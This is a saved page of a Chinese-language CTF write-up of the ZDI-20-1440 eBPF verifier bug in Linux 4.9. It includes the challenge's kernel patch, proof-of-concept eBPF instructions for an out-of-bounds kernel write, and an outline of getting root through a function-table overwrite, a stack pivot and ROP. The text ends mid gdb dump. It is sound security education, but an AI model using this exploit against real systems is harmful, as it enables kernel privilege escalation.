<!DOCTYPE html>
<!-- saved from url=(0057)https://blog.hexrabbit.io/2021/02/07/ZDI-20-1440-writeup/ -->
<html lang="zh-TW"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="generator" content="Hexo 3.9.0">
  
  <link rel="apple-touch-icon" sizes="76x76" href="https://blog.hexrabbit.io/img/favicon.png">
  <link rel="icon" type="image/png" href="https://blog.hexrabbit.io/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="description" content="">
  <meta name="author" content="HexRabbit">
  <meta name="keywords" content="pwn, reversing, code">
  <meta name="og:image" content="https://blog.hexrabbit.io/img/banner.png">
  <meta name="og:site_name" content="HexRabbit&#39;s Blog">
  <meta name="og:url" content="https://blog.hexrabbit.io/2021/02/07/ZDI-20-1440-writeup/">
  <meta property="og:image:width" content="1370">
  <meta property="og:image:height" content="717">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:creator" content="@h3xrabbit">
  <meta name="twitter:image" content="https://blog.hexrabbit.io/img/banner.png">
  <meta name="twitter:url" content="https://blog.hexrabbit.io/2021/02/07/ZDI-20-1440-writeup/">
  <meta name="twitter:title" content="ZDI-20-1440 Writeup - HexRabbit&#39;s Blog">
  
    <meta name="og:type" content="article">
    <meta name="og:title" content="ZDI-20-1440 Writeup - HexRabbit&#39;s Blog">
    <meta name="og:description" content="我把自己的第一個 1day exploit 出成題目了，因為好像有點紀念價值就隨筆寫一下，如果有錯誤">
    <meta name="twitter:decription" content="我把自己的第一個 1day exploit 出成題目了，因為好像有點紀念價值就隨筆寫一下，如果有錯誤">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <title>ZDI-20-1440 Writeup - HexRabbit's Blog</title>

  <style class="anchorjs"></style><link rel="stylesheet" href="./2021 - ZDI-20-1440 Writeup_files/bootstrap.min.css">


  <link rel="stylesheet" href="./2021 - ZDI-20-1440 Writeup_files/github-markdown.min.css">
  <link rel="stylesheet" href="./2021 - ZDI-20-1440 Writeup_files/hint.min.css">

  
    <link rel="stylesheet" href="./2021 - ZDI-20-1440 Writeup_files/tomorrow-night-eighties.min.css">
  

  


<!-- 主题依赖的图标库，不要自行修改 -->
<link rel="stylesheet" href="./2021 - ZDI-20-1440 Writeup_files/font_1749284_yg9cfy8wd6.css">

<link rel="stylesheet" href="./2021 - ZDI-20-1440 Writeup_files/font_1736178_pjno9b9zyxs.css">

<link rel="stylesheet" href="./2021 - ZDI-20-1440 Writeup_files/main.css">

<!-- 自定义样式保持在最底部 -->


  <script async="" src="./2021 - ZDI-20-1440 Writeup_files/analytics.js.下載"></script><script src="./2021 - ZDI-20-1440 Writeup_files/utils.js.下載"></script>
<link rel="alternate" href="https://blog.hexrabbit.io/atom.xml" title="HexRabbit&#39;s Blog" type="application/atom+xml">
<link rel="alternate" href="https://blog.hexrabbit.io/rss2.xml" title="HexRabbit&#39;s Blog" type="application/rss+xml">
</head>


<body>
  <header style="height: 45vh;">
    <nav id="navbar" class="navbar fixed-top navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="https://blog.hexrabbit.io/">&nbsp;<strong>HexRabbit's Blog</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="https://blog.hexrabbit.io/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="https://blog.hexrabbit.io/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="https://blog.hexrabbit.io/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="https://blog.hexrabbit.io/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="https://blog.hexrabbit.io/about/">
                <i class="iconfont icon-user-fill"></i>
                About
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="view intro-2" id="background" parallax="true" style="background: url(&quot;/img/post.jpg&quot;) center center / cover no-repeat; transform: translate3d(0px, 0px, 0px);">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="container text-center white-text fadeInUp">
            <span class="h2" id="subtitle">ZDI-20-1440 Writeup&nbsp;</span><span class="typed-cursor h2 typed-cursor--blink">_</span>

            
              
  <div class="mt-3 post-meta">
    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
    <time datetime="2021-02-07 15:05">
      2021年2月7日 15:05
    </time>
  </div>


<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      4.1k words
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      30
       min
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5" id="board">
          <div class="post-content mx-auto" id="post">
            
            <article class="markdown-body">
              <p>我把自己的第一個 1day exploit 出成題目了，因為好像有點紀念價值就隨筆寫一下，如果有錯誤或缺漏的部分還請各位鞭小力點，本題是我出給今年 AIS3 EOF CTF final 的題目 <code>Day One</code>，可惜的是因為比賽時間過短沒有人在賽中解出來QQ</p>
<h2 id="題目簡介"><a href="https://blog.hexrabbit.io/2021/02/07/ZDI-20-1440-writeup/#%E9%A1%8C%E7%9B%AE%E7%B0%A1%E4%BB%8B" class="headerlink" title="題目簡介"></a>題目簡介<a class="anchorjs-link " aria-label="Anchor" data-anchorjs-icon="" href="https://blog.hexrabbit.io/2021/02/07/ZDI-20-1440-writeup/#%E9%A1%8C%E7%9B%AE%E7%B0%A1%E4%BB%8B" style="font: 1em / 1 anchorjs-icons; padding-left: 0.375em;"></a></h2><p>利用的漏洞出自於 <a href="https://www.thezdi.com/blog/2021/1/18/zdi-20-1440-an-incorrect-calculation-bug-in-the-linux-kernel-ebpf-verifier" target="_blank" rel="noopener">ZDI-20-1440</a>，這是由 TokyoWesterns 成員同時目前也任職於 Flatt Security 的 Ryota Shiga (<a href="https://twitter.com/ga_ryo_" target="_blank" rel="noopener">@Ga_ryo_</a>) 找到的一個位於 extended Berkeley Packet Filter (eBPF) verifier 的 verification bypass，透過利用該漏洞最終可以完成本地提權。(很可惜的是)由於該漏洞只存在 linux 的長期維護版本 (4.9 - 4.13) 中，目前只有 Debian 9 受到影響，且觸發條件要求了一個相對高權限的 <code>CAP_SYS_ADMIN</code></p>
<p>但是這不影響我把它拿來出成一道題目，所以接下來就讓我們分析要如何運用吧 :)</p>
<h2 id="初見"><a href="https://blog.hexrabbit.io/2021/02/07/ZDI-20-1440-writeup/#%E5%88%9D%E8%A6%8B" class="headerlink" title="初見"></a>初見<a class="anchorjs-link " aria-label="Anchor" data-anchorjs-icon="" href="https://blog.hexrabbit.io/2021/02/07/ZDI-20-1440-writeup/#%E5%88%9D%E8%A6%8B" style="font: 1em / 1 anchorjs-icons; padding-left: 0.375em;"></a></h2><p>題目與尋常的 kernel pwnable 基本上一樣，提供了 <code>bzImage</code>/<code>rootfs.cpio.gz</code>/<code>run.sh</code> 中提供給參賽者，唯一的差別是多給了一個 <code>patch.diff</code>，這只是讓我在設計題目上能夠比較方便，所以將前述的 <code>CAP_SYS_ADMIN</code> 去除掉讓一般使用者也能夠觸發 bug，當然我也有注意不讓使用者透過 <code>print_bpf_insn</code> 印出的 debug 資訊 leak kernel address</p>
<div class="hljs"><pre><code class="hljs diff">diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c
index 335c002..08dca71 100644
<span class="hljs-comment">--- a/kernel/bpf/verifier.c</span>
<span class="hljs-comment">+++ b/kernel/bpf/verifier.c</span>
@@ -352,7 +352,7 @@ static void print_bpf_insn(const struct bpf_verifier_env *env,
 			u64 imm = ((u64)(insn + 1)-&gt;imm &lt;&lt; 32) | (u32)insn-&gt;imm;
 			bool map_ptr = insn-&gt;src_reg == BPF_PSEUDO_MAP_FD;
 
<span class="hljs-deletion">-			if (map_ptr &amp;&amp; !env-&gt;allow_ptr_leaks)</span>
<span class="hljs-addition">+			if (map_ptr &amp;&amp; !capable(CAP_SYS_ADMIN))</span>
 				imm = 0;
 
 			verbose("(%02x) r%d = 0x%llx\n", insn-&gt;code,
@@ -3627,7 +3627,7 @@ int bpf_check(struct bpf_prog **prog, union bpf_attr *attr)
 	if (ret &lt; 0)
 		goto skip_full_check;
 
<span class="hljs-deletion">-	env-&gt;allow_ptr_leaks = capable(CAP_SYS_ADMIN);</span>
<span class="hljs-addition">+	env-&gt;allow_ptr_leaks = true;</span>
 
 	ret = do_check(env);
 
@@ -3731,7 +3731,7 @@ int bpf_analyzer(struct bpf_prog *prog, const struct bpf_ext_analyzer_ops *ops,
 	if (ret &lt; 0)
 		goto skip_full_check;
 
<span class="hljs-deletion">-	env-&gt;allow_ptr_leaks = capable(CAP_SYS_ADMIN);</span>
<span class="hljs-addition">+	env-&gt;allow_ptr_leaks = true;</span>
 
 	ret = do_check(env);</code><button class="copy-btn copy-btn-light" data-clipboard-snippet=""><i class="iconfont icon-copy"></i><span>Copy</span></button></pre></div>

<p>除了小小的 kernel patch 以外，提供的 bzImage 裡就是一個 4.9.249 版號、開啟 BPF syscall 及預設 eBPF JIT 的 linux kernel</p>
<h2 id="extended-Berkeley-Packet-Filter-eBPF"><a href="https://blog.hexrabbit.io/2021/02/07/ZDI-20-1440-writeup/#extended-Berkeley-Packet-Filter-eBPF" class="headerlink" title="extended Berkeley Packet Filter (eBPF)"></a>extended Berkeley Packet Filter (eBPF)<a class="anchorjs-link " aria-label="Anchor" data-anchorjs-icon="" href="https://blog.hexrabbit.io/2021/02/07/ZDI-20-1440-writeup/#extended-Berkeley-Packet-Filter-eBPF" style="font: 1em / 1 anchorjs-icons; padding-left: 0.375em;"></a></h2><p>在開始談 ZDI-20-1440 這個漏洞之前，讀者需要先對 eBPF 有些先備知識，因為我也不是這方面的專家，在這裡推薦還不太熟的讀者參考以下幾篇不錯的文章:</p>
<ul>
<li><a href="https://hackmd.io/@sysprog/linux-ebpf" target="_blank" rel="noopener">Linux 核心設計: 透過 eBPF 觀察作業系統行為</a><ul>
<li>由 <a href="https://twitter.com/jserv" target="_blank" rel="noopener">jserv</a> 老師開設的「Linux 核心設計」課程教材，對於其歷史與設計概念有著詳盡的介紹，十分推薦一讀</li>
</ul>
</li>
<li><a href="http://www.brendangregg.com/blog/2019-12-02/bpf-a-new-type-of-software.html" target="_blank" rel="noopener">BPF: A New Type of Software</a><ul>
<li>Brendan Gregg 作為 kernel and performance engineer 任職於 Netflix，他相當擅長於 kernel 層級的效能優化，是 BPF 早期的 promoter 同時他也是 BPF Performance Tools 一書的作者</li>
</ul>
</li>
<li><a href="https://www.zerodayinitiative.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification" target="_blank" rel="noopener">CVE-2020-8835: LINUX KERNEL PRIVILEGE ESCALATION VIA IMPROPER EBPF PROGRAM VERIFICATION</a><ul>
<li>Manfred Paul (<a href="https://twitter.com/_manfp" target="_blank" rel="noopener">@_manfp</a>) 撰寫的 writeup，他利用該漏洞在 Pwn2Own 2020 上成功於 linux 上以一般使用者身份提權拿到 root shell</li>
</ul>
</li>
</ul>
<p>總的來說，讀者可以把 eBPF 想成一個執行在 kernel 中的小程式，有著自己的 bytecode 語法和對應的 interpreter，且會在 user 指定的位置被 kernel 解析並執行，常見的應用像是 seccomp、tcpdump、bpftrace 便是利用 eBPF 在 kernel 中插入「探針」將資訊解析並傳回 userland。</p>
<p>因為這支小程式會在 kernel 中執行，此時效能考量就變得相當重要，所以 linux kernel 為其內建了一個 JIT (Just-In-Time) compiler 用來消除 interpreter 轉譯和執行的 overhead，但很明顯的若是使用者插入了錯誤或惡意的 code 則極有可能導致 kernel panic 或甚至是達到 EoP (Escalation-of-Privilege)，為了避免這種情形 kernel 在載入 BPF program 時會先經過兩次檢查:</p>
<ol>
<li><a href="https://elixir.bootlin.com/linux/v4.9.249/source/kernel/bpf/verifier.c#L2564" target="_blank" rel="noopener">check_cfg()</a> 會確保 BPF program 中不包含任何迴圈</li>
<li><a href="https://elixir.bootlin.com/linux/v4.9.249/source/kernel/bpf/verifier.c#L2874" target="_blank" rel="noopener">do_check()</a> 則是檢查是否存在錯誤的指令，並透過型別以及紀錄變數的數值範圍來保證程式不會有越界存取</li>
</ol>
<h2 id="漏洞成因"><a href="https://blog.hexrabbit.io/2021/02/07/ZDI-20-1440-writeup/#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0" class="headerlink" title="漏洞成因"></a>漏洞成因<a class="anchorjs-link " aria-label="Anchor" data-anchorjs-icon="" href="https://blog.hexrabbit.io/2021/02/07/ZDI-20-1440-writeup/#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0" style="font: 1em / 1 anchorjs-icons; padding-left: 0.375em;"></a></h2><p>回到本題的漏洞上，如上述提到的 BPF verifier 為了確保指令不可能越界存取，會去記錄每個 register (這裡是指 BPF 裡定義的 <a href="https://elixir.bootlin.com/linux/v4.9.249/source/include/uapi/linux/bpf.h#L40" target="_blank" rel="noopener">register</a>) 的可能的數值範圍，有了這個先備知識後 ZDI-20-1440 的成因就相當容易瞭解了，以下是在 <a href="https://elixir.bootlin.com/linux/v4.9.249/source/kernel/bpf/verifier.c#L1730" target="_blank" rel="noopener">kernel/bpf/verifier.c</a> 中有問題的原始碼:</p>
<div class="hljs"><pre><code class="hljs cpp">    <span class="hljs-comment">// ...</span>
    <span class="hljs-keyword">case</span> BPF_RSH: 
<span class="hljs-comment">/* RSH by a negative number is undefined, and the BPF_RSH is an 
 * unsigned shift, so make the appropriate casts. 
 */</span> 
        <span class="hljs-keyword">if</span> (min_val &lt; <span class="hljs-number">0</span> || dst_reg-&gt;min_value &lt; <span class="hljs-number">0</span>) 
            dst_reg-&gt;min_value = BPF_REGISTER_MIN_RANGE; 
        <span class="hljs-keyword">else</span> 
            dst_reg-&gt;min_value = (u64)(dst_reg-&gt;min_value) &gt;&gt; min_val;  <span class="hljs-comment">// &lt;-- (3) </span>
        <span class="hljs-keyword">if</span> (dst_reg-&gt;max_value != BPF_REGISTER_MAX_RANGE) 
            dst_reg-&gt;max_value &gt;&gt;= max_val;   <span class="hljs-comment">// &lt;-- (4) </span>
        <span class="hljs-keyword">break</span>; 
    <span class="hljs-comment">// ...</span></code><button class="copy-btn copy-btn-light" data-clipboard-snippet=""><i class="iconfont icon-copy"></i><span>Copy</span></button></pre></div>

<p><code>BPF_RSH</code> 是一個 BPF instruction，基本上操作可以等價於以下的 pseudocode</p>
<div class="hljs"><pre><code class="hljs undefined">dst_reg &gt;&gt;= src_reg</code><button class="copy-btn copy-btn-light" data-clipboard-snippet=""><i class="iconfont icon-copy"></i><span>Copy</span></button></pre></div>

<p>問題就出在 verifier 更新 register 的可能的數值範圍時有邏輯上的錯誤<code>(3,4)</code>，正常情況下 <code>X &gt;&gt;= Y</code> 後，<code>X.max_val</code> 應該要被更新為 <code>X.max_val &gt;&gt; Y.min_val</code>，同理 <code>X.min_val</code> 應該要更新為 <code>X.min_val &gt;&gt; Y.max_val</code>，但這裡的錯誤的寫成了 <code>X.max_val &gt;&gt; Y.max_val</code>、<code>X.min_val &gt;&gt; Y.min_val</code> 直接導致了 verifier 其後做的邊界檢查可以被輕鬆繞過<code>(5)</code></p>
<div class="hljs"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">do_check</span><span class="hljs-params">(struct bpf_verifier_env *env)</span> 
</span>{ 
<span class="hljs-comment">// ... </span>
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (class == BPF_STX) { 
            <span class="hljs-comment">/* check that memory (dst_reg + off) is writeable */</span> 
            err = check_mem_access(env, insn_idx, insn-&gt;dst_reg, insn-&gt;off, 
                           BPF_SIZE(insn-&gt;code), BPF_WRITE, 
                           insn-&gt;src_reg);   &lt;-- (<span class="hljs-number">5</span>) 
<span class="hljs-comment">// ... </span>
}</code><button class="copy-btn copy-btn-light" data-clipboard-snippet=""><i class="iconfont icon-copy"></i><span>Copy</span></button></pre></div>

<p>可以發現這個漏洞與某些 Javascript JIT compiler 上的漏洞非常相似，都是在進行邊界檢查的時候以不正確的邏輯對輸入做驗證，使得 optimizer/verifier 拿到錯誤的資訊最終導致檢查被繞過，真是簡單暴力</p>
<p>(不過其實就算不開啟 <code>CONFIG_BPF_JIT</code> 也可以觸發這個 bug，因為在檢查過後 interpreter 不會在執行時另外做邊界檢查)</p>
<h2 id="PoC"><a href="https://blog.hexrabbit.io/2021/02/07/ZDI-20-1440-writeup/#PoC" class="headerlink" title="PoC"></a>PoC<a class="anchorjs-link " aria-label="Anchor" data-anchorjs-icon="" href="https://blog.hexrabbit.io/2021/02/07/ZDI-20-1440-writeup/#PoC" style="font: 1em / 1 anchorjs-icons; padding-left: 0.375em;"></a></h2><p>ZDI blog 內文中基本上已經詳細給出能夠 trigger bug 的 PoC 了，利用流程如下:</p>
<p>首先註冊兩個 bpf map，接著從註冊好的 map 中把我們傳入的參數放到 <code>BPF_REG_8</code> 和 <code>BPF_REG_9</code> 上，這是接著要用於騙過 verifier 的數值，並且將 <code>BPF_REG_0</code> 設為 map2 array 的地址</p>
<blockquote>
<p>bpf map 裡面有個可以自訂元素大小和個數的 array，使用者透過 <code>bpf_create_map()</code> 向 kernel 註冊後便可以對其讀取和寫入，作為 userland 和 bpf program 溝通的橋樑</p>
</blockquote>
<div class="hljs"><pre><code class="hljs cpp"><span class="hljs-comment">// put the address of bpf array to BPF_REG_0</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> BPF_GET_MAP(fd, idx) \ </span>
        BPF_LD_MAP_FD(BPF_REG_1, fd), \ 
        BPF_MOV64_IMM(BPF_REG_2, idx), \ 
        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_2, <span class="hljs-number">-4</span>),  \ 
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10), \ 
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="hljs-number">-4</span>), \ 
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, BPF_FUNC_map_lookup_elem), \ 
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>), \ 
        BPF_EXIT_INSN(), 

BPF_GET_MAP(map1_fd, <span class="hljs-number">1</span>) 
BPF_LDX_MEM(BPF_W, BPF_REG_8, BPF_REG_0, <span class="hljs-number">0</span>), 
 
BPF_GET_MAP(map1_fd, <span class="hljs-number">2</span>) 
BPF_LDX_MEM(BPF_W, BPF_REG_9, BPF_REG_0, <span class="hljs-number">0</span>), 
 
BPF_GET_MAP(map2_fd, <span class="hljs-number">0</span>)</code><button class="copy-btn copy-btn-light" data-clipboard-snippet=""><i class="iconfont icon-copy"></i><span>Copy</span></button></pre></div>

<p>再來利用 jmp 系列指令，控制讓 verifier 認為 0 ≤ <code>BPF_REG_8</code> &lt; 4096、0 ≤ <code>BPF_REG_9</code> &lt; 1024</p>
<div class="hljs"><pre><code class="hljs cpp">BPF_JMP_IMM(BPF_JGE, BPF_REG_8, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>), 
BPF_JMP_IMM(BPF_JA, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>), <span class="hljs-comment">// jmp to exit</span>
BPF_JMP_IMM(BPF_JGE, BPF_REG_8, <span class="hljs-number">0x1000</span>, <span class="hljs-number">8</span>), 
 
BPF_JMP_IMM(BPF_JGE, BPF_REG_9, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>), 
BPF_JMP_IMM(BPF_JA, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>), <span class="hljs-comment">// jmp to exit</span>
BPF_JMP_IMM(BPF_JGE, BPF_REG_9, <span class="hljs-number">1024</span>, <span class="hljs-number">4</span>),</code><button class="copy-btn copy-btn-light" data-clipboard-snippet=""><i class="iconfont icon-copy"></i><span>Copy</span></button></pre></div>

<p>由於存在前面討論到的問題，此時 verifier 會認為 0 ≤ <code>BPF_REG_8</code> ≤ 0 也就是 <code>BPF_REG_8</code> = 0，所以我們便可以 bypass 檢查對 *(map2 + (<code>BPF_REG_8</code> &gt;&gt; <code>BPF_REG_9</code>)) 越界寫入 0xdeadbeef，當然除了越界寫，同樣的越界讀也是可以的</p>
<div class="hljs"><pre><code class="hljs cpp">BPF_ALU64_REG(BPF_RSH, BPF_REG_8, BPF_REG_9), <span class="hljs-comment">// r8 &gt;&gt;= r9</span>
BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_8), <span class="hljs-comment">// r0 += r8 </span>
BPF_MOV64_IMM(BPF_REG_1, <span class="hljs-number">0xdeadbeef</span>),         <span class="hljs-comment">// r1 = 0xdeadbeef</span>
BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_1, <span class="hljs-number">0</span>), <span class="hljs-comment">// *(r0) = r1</span>
BPF_MOV64_IMM(BPF_REG_0, <span class="hljs-number">0</span>), 
BPF_EXIT_INSN(),</code><button class="copy-btn copy-btn-light" data-clipboard-snippet=""><i class="iconfont icon-copy"></i><span>Copy</span></button></pre></div>

<h2 id="Exploit"><a href="https://blog.hexrabbit.io/2021/02/07/ZDI-20-1440-writeup/#Exploit" class="headerlink" title="Exploit"></a>Exploit<a class="anchorjs-link " aria-label="Anchor" data-anchorjs-icon="" href="https://blog.hexrabbit.io/2021/02/07/ZDI-20-1440-writeup/#Exploit" style="font: 1em / 1 anchorjs-icons; padding-left: 0.375em;"></a></h2><p>exploit 的部分在出題時一開始只開 smep，結果後來發現似乎 smap 也可以利用，於是就寫了兩個版本:</p>
<h3 id="smep"><a href="https://blog.hexrabbit.io/2021/02/07/ZDI-20-1440-writeup/#smep" class="headerlink" title="+smep"></a>+smep<a class="anchorjs-link " aria-label="Anchor" data-anchorjs-icon="" href="https://blog.hexrabbit.io/2021/02/07/ZDI-20-1440-writeup/#smep" style="font: 1em / 1 anchorjs-icons; padding-left: 0.375em;"></a></h3><p>稍微觀察一下 kernel 內一些操作 <code>bpf_map</code> 結構的 function 就可以發現到 bpf_map 是存在於一個更大的結構 <code>bpf_array</code> 當中</p>
<div class="hljs"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> *<span class="hljs-title">array_map_lookup_elem</span><span class="hljs-params">(struct bpf_map *<span class="hljs-built_in">map</span>, <span class="hljs-keyword">void</span> *key)</span>
</span>{
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_array</span> *<span class="hljs-title">array</span> = <span class="hljs-title">container_of</span>(<span class="hljs-title">map</span>, <span class="hljs-title">struct</span> <span class="hljs-title">bpf_array</span>, <span class="hljs-title">map</span>);</span> <span class="hljs-comment">// &lt;-- 注意到 container_of 這個 macro</span>
    u32 index = *(u32 *)key;
    ...
}</code><button class="copy-btn copy-btn-light" data-clipboard-snippet=""><i class="iconfont icon-copy"></i><span>Copy</span></button></pre></div>

<p>繼續觀察便可以得知 <code>bpf_array.value</code> 就是存放 array value 的記憶體區域</p>
<div class="hljs"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_array</span> {</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map</span> <span class="hljs-title">map</span>;</span>
    u32 elem_size;
    u32 index_mask;
    <span class="hljs-comment">/* 'ownership' of prog_array is claimed by the first program that
     * is going to use this map or by the first program which FD is stored
     * in the map to make sure that all callers and callees have the same
     * prog_type and JITed flag
     */</span>
    <span class="hljs-keyword">enum</span> bpf_prog_type owner_prog_type;
    <span class="hljs-keyword">bool</span> owner_jited;
    <span class="hljs-keyword">union</span> {
        <span class="hljs-keyword">char</span> value[<span class="hljs-number">0</span>] __aligned(<span class="hljs-number">8</span>);
        <span class="hljs-keyword">void</span> *ptrs[<span class="hljs-number">0</span>] __aligned(<span class="hljs-number">8</span>);
        <span class="hljs-keyword">void</span> __percpu *pptrs[<span class="hljs-number">0</span>] __aligned(<span class="hljs-number">8</span>);
    };
};</code><button class="copy-btn copy-btn-light" data-clipboard-snippet=""><i class="iconfont icon-copy"></i><span>Copy</span></button></pre></div>

<p>那既然我們有辦法做到對這個 array 加上任意 offset 進行讀寫的話，<code>bpf_array</code> 上的元素都是可能可以被利用的 target，於是繼續追看看有什麼是容易被利用的</p>
<div class="hljs"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map</span> {</span>
    <span class="hljs-comment">/* 1st cacheline with read-mostly members of which some
     * are also accessed in fast-path (e.g. ops, max_entries).
     */</span>
    <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map_ops</span> *<span class="hljs-title">ops</span> ____<span class="hljs-title">cacheline_aligned</span>;</span> <span class="hljs-comment">// &lt;--</span>
    <span class="hljs-keyword">enum</span> bpf_map_type map_type;
    u32 key_size;
    u32 value_size;
    u32 max_entries;
    u32 map_flags;
    u32 pages;
    <span class="hljs-keyword">bool</span> unpriv_array;
    <span class="hljs-comment">/* 7 bytes hole */</span>

    <span class="hljs-comment">/* 2nd cacheline with misc members to avoid false sharing
     * particularly with refcounting.
     */</span>
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_struct</span> *<span class="hljs-title">user</span> ____<span class="hljs-title">cacheline_aligned</span>;</span>
    <span class="hljs-keyword">atomic_t</span> refcnt;
    <span class="hljs-keyword">atomic_t</span> usercnt;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">work_struct</span> <span class="hljs-title">work</span>;</span>
};</code><button class="copy-btn copy-btn-light" data-clipboard-snippet=""><i class="iconfont icon-copy"></i><span>Copy</span></button></pre></div>

<p>最終發現 <code>bpf_map.ops</code> 預設會指向一個 function table <code>array_ops</code>，這也剛好是一個預設被 linux kernel export 的 symbol，也就是只需要把這個 function table 的位置寫掉換成我們可控的位置就可以輕鬆控到 RIP</p>
<div class="hljs"><pre><code class="hljs cpp"><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map_ops</span> <span class="hljs-title">array_ops</span> = {</span>
	.map_alloc = array_map_alloc,
	.map_free = array_map_free,
	.map_get_next_key = array_map_get_next_key,
	.map_lookup_elem = array_map_lookup_elem,
	.map_update_elem = array_map_update_elem,
	.map_delete_elem = array_map_delete_elem,
};</code><button class="copy-btn copy-btn-light" data-clipboard-snippet=""><i class="iconfont icon-copy"></i><span>Copy</span></button></pre></div>

<p>而且因為只開 smep 的緣故 function table 的地址可以直接填上在 userland 的 array，完全不需要 leak kernel heap address，再來透過 syscall 觸發執行我們偽造的 function，可以串上常用的 <code>xchg eax, esp</code> gadget 把 stack pivot 到 userland 做 ROP 便可以拿到 root shell</p>
<p>這部分的 exploit 由於篇幅關係就不放上來了，有興趣的可以到我的 <a href="https://github.com/HexRabbit/CTF-writeup/blob/master/2021/eofctf/dayone/exp/smep_exp.c" target="_blank" rel="noopener">github</a> 看</p>
<h3 id="smap"><a href="https://blog.hexrabbit.io/2021/02/07/ZDI-20-1440-writeup/#smap" class="headerlink" title="+smap"></a>+smap<a class="anchorjs-link " aria-label="Anchor" data-anchorjs-icon="" href="https://blog.hexrabbit.io/2021/02/07/ZDI-20-1440-writeup/#smap" style="font: 1em / 1 anchorjs-icons; padding-left: 0.375em;"></a></h3><p>開啟 smap 之後便不能將偽造的 function table 放在 userland，而是必須要放在 kernel heap 上，不過因為 bpf map 中的內容可控，這對我們來說也只是小菜一碟，唯一需要額外做的事只是 leak kernel heap address 而已</p>
<p>用 gdb 接上 qemu 觀察很容易就可以辨識出在 <code>struct bpf_map</code> 當中有存放 heap address</p>
<div class="hljs"><pre><code class="hljs undefined"><span class="hljs-string">Breakpoint</span> <span class="hljs-number">1</span><span class="hljs-string">,</span> <span class="hljs-number">0xffffffff8112b850</span> <span class="hljs-string">in</span> <span class="hljs-string">array_map_update_elem</span> <span class="hljs-string">()</span>
<span class="hljs-string">gef➤</span>  <span class="hljs-string">x/20gx</span> <span class="hljs-string">$rdi</span>
<span class="hljs-attr">0xffff88000e320a00:</span>     <span class="hljs-number">0xffffffff81a12100</span>      <span class="hljs-number">0x0000000400000002</span>
